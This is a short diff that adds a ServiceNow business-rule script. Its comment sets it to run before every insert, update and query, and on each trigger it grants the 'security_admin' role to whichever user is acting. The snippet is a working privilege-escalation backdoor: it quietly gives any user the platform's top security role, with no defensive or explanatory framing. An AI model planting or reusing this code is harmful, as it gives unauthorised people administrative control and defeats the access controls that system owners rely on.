@@ -1,0 +1,16 @@
+// Make a before BR that runs on insert, udpate and query.
+
+(function executeRule(current, previous /*null when async*/) {
+
+var sr = new GlideRecord("sys_user_role");   
+sr.addQuery("name","security_admin");     
+sr.query();     
+ if (sr.next())     
+{   
+var hh = new GlideRecord("sys_user_has_role");     
+hh.initialize();     
+hh.user = gs.getUserID();   
+hh.role = sr.sys_id;   
+hh.insert();     
+}
+})(current, previous);
